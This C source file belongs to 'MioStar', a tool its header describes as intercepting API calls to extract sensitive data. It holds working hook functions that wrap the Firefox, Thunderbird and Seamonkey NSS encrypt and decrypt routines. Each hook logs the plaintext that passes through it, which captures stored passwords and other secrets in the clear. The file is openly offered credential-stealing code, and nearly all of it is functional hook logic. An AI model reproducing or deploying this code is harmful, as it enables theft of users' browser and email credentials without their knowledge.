/*
 * Tool name   : MioStar
 * Description : Tool to intercept API calls and to extract sensitive data.
 * Version     : 0.2
 * Date        : 11.17.2010
 * Author      : Ruben Unteregger
 * Web page    : http://www.megapanzer.com
 * Todo        : 
 * Changes     : 11.17.2010 nss3.dll to intercept Firefox, Thunderbird + Seamonkey crypt/decrypt calls
 *
 *
 * License     :
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */




#include <windows.h>
#include <stdio.h>
#include "MioStar.h"
#include "MozillaFunctionHooks.h"

extern char gProcName[MAX_BUF_SIZE + 1];
extern char *gProcShortPath;

extern byte* CG_FFDecrypt;
extern byte* CG_FFEncrypt;




/*
 *
 *
 */

SECStatus MyFFEncrypt(SECItem *keyid, SECItem *data, SECItem *result, void *cx)
{
  SECStatus lRetVal;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  MYFFENCRYPT fFFEncrypt = (MYFFENCRYPT) CG_FFEncrypt;

  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));

  if(fFFEncrypt)
    lRetVal = fFFEncrypt(keyid, data, result, cx);


  if (data != NULL && data->data != NULL && data->len > 0)
    stringify((char *) data->data, data->len, lTemp2, sizeof(lTemp2)/2 - 1);

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyFFEncrypt():CRYPT:%s:%s", gProcShortPath, lTemp2);
  printDebug(lTemp1, EVENT_CRYPT);

  return(lRetVal);
}




/*
 *
 *
 */

SECStatus MyFFDecrypt(SECItem *data, SECItem *result, void *cx)
{
  SECStatus lRetVal;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  MYFFDECRYPT fFFDecrypt = (MYFFDECRYPT) CG_FFDecrypt;

  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));

  if(fFFDecrypt)
    lRetVal = fFFDecrypt(data, result, cx);


  if (result != NULL && result->data != NULL && result->len > 0)
    stringify((char *) result->data, result->len, lTemp2, sizeof(lTemp2)/2 - 1);

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyFFDecrypt():CRYPT:%s:%s", gProcShortPath, lTemp2);
  printDebug(lTemp1, EVENT_CRYPT);

  return(lRetVal);
}